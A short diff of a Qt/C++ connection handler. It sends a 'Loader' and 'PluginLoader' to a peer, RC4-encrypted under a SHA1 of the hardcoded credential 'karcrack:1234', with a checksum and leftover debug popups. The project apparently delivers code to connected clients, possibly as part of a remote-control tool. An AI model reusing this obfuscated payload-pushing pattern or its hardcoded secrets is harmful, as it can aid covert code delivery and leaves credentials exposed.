@@ -28,27 +28,25 @@ void ConnectionManager::SetupConnection(Connection *connection)
             TotalToSend.append(Loader);
             TotalToSend.append(PluginLoader);
 
-            //TODO:
-            QString Username="Zero";
-            QString Pass="1234";
-
             Crypto Crypt1(TotalToSend);
-            QString sha1=Crypt1.sha1(Username+Pass);
-            QMessageBox::information(0,":P",sha1);
-
+            //TODO
+            QString sha1=Crypt1.sha1(QString("karcrack:1234"));
+            QMessageBox::information(0,"Hash SHA1",sha1);
             Crypt1.RC4(sha1.toAscii());
+
             qint32 CheckSum=Crypt1.jenkins_one_at_a_time();
 
+            QMessageBox::information(0,"Checksum","0x"+QString::number(CheckSum,16));
+
             TotalToSend.clear();
-            TotalToSend.append(CheckSum);
+            TotalToSend.append((char*)&CheckSum,4);
             TotalToSend.append(Crypt1.getData());
 
-            QDataStream out(connection);
-            out.setVersion(QDataStream::Qt_4_8);
-            out<<TotalToSend;
+            connection->write(TotalToSend);
 
             connect(connection,SIGNAL(readyRead()),mngMessage,SLOT(readMessage()));
             connection->setState(Connection::Ready);
+            connection->setSetupState(Connection::Finished);
     }
     else if(connection->getSetupState()==Connection::Finished)
     {
